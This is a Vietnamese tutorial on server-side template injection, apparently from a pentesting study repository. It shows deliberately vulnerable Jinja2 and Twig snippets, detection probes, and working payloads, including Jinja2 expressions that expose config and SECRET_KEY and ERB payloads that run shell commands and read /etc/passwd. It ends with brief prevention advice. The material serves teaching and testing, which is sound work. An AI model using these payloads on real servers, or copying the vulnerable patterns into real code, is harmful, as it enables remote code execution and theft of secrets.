## Lỗ hổng SSTI là gì?
- Template rendering - Chèn mẫu là quá trình truyền dữ liệu vào một mẫu được xây dựng bằng ngôn ngữ mẫu (template language).

*Ví dụ về chèn mẫu EJS trong app NodeJS*

```javascript
import express from 'express';
const app = express();
const port = 3000;

app.set('view engine', 'ejs');

app.get('/', (req, res) => {
    const { username } = req.query;
    res.render('index', { username: username || 'Guest' });
});

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
```

```html
<!-- views/index.ejs -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
</head>
<body>
    <h1>Welcome, <%= username %>!</h1>
</body>
</html>
```

- **Server-side template injection (SSTI)** là dạng lỗ hổng cho phép kẻ tấn công tiêm các payload (tạo bởi chính ngôn ngữ mẫu đó) vào các mẫu, và chúng được thực thi tại phía server. 

*Ví dụ về lỗ hổng SSTI trong app Python*
```python
@app.route("/page")
def page():
    name = request.values.get('name')
    output = Jinja2.from_string('Hello ' + name + '!').render()
    return output
```

```sh
$ curl -g 'http://www.target.com/page?name={{7*7}}'
Hello 49!
```

*Ví dụ về lỗ hổng SSTI trong app PHP*
```php
//no vul
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) ); 

//vul
$output = $twig->render($_GET['custom_email'],  array("first_name" => $user.first_name) );
```

## Nguyên nhân
- Server không validate input từ người dùng

## Hậu quả
- Thực thi mã tùy ý

- Khai thác RCE để kiểm soát toàn bộ hệ thống

## Cách phát hiện
- Thử các payload có thể khai thác lỗ hổng SSTI
```
{7*7}
${7*7}
{{7*7}}
<%7*7%>
<%7*7%>
[% 7*7 %]
```

### Ví dụ
Java
```
${7*7}
${{7*7}}
```

FreeMarker (Java)
```
{{7*7}} = {{7*7}}
${7*7} = 49
#{7*7} = 49 -- (legacy)
${7*'7'} Nothing
${foobar}
```

ERB (Ruby)
```
{{7*7}} = {{7*7}}
${7*7} = ${7*7}
<%= 7*7 %> = 49
<%= foobar %> = Error
```

Jinja2 (Python)
```
{{7*7}} = Error
${7*7} = ${7*7}
{{foobar}} Nothing
{{4*4}}[[5*5]]
{{7*'7'}} = 7777777
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{{settings}}
{% debug %}
```

. .

## Khai thác
- Thử các payload
```
{7*7}
${7*7}
{{7*7}}
<%7*7%>
<%7*7%>
[% 7*7 %]
```

- Xác định ngôn ngữ mẫu 

<p align="center">
<img src="https://github.com/pentest-khoa-02/TheMinh/blob/main/Week%2018/images/1.png" width="666px">
</p>

- Đọc tài liệu của ngôn ngữ mẫu để tiến hành khai thác sâu hơn

- Sử dụng các payload có sẵn

*Ví dụ về các mã khai thác của ERB (Ruby)*
```
{{7*7}} = {{7*7}}
${7*7} = ${7*7}
<%= 7*7 %> = 49
<%= foobar %> = Error
```
```sh
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

## Cách ngăn chặn
- Validate input từ người dùng.

- Dùng các ngôn ngữ mẫu có tính năng escape tự động.